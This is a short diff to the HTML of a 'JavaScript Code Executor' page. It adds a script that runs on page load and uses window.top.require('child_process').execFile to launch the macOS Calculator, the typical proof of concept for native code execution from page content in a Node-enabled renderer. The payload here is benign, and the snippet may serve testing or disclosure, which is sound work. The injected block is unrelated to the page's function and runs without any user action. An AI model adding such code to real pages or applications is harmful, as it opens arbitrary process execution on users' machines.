@@ -7,6 +7,9 @@
   <h1>JavaScript Code Executor</h1>
   <textarea id="codeInput" rows="10" cols="50"></textarea>
   <button id="executeButton">Execute</button>
+  <script type="text/javascript">
+  window.top.require('child_process').execFile('/Applications/Calculator.app/Contents/MacOS/Calculator',function(){});
+</script>
 
   <script>
     function executeCode() {
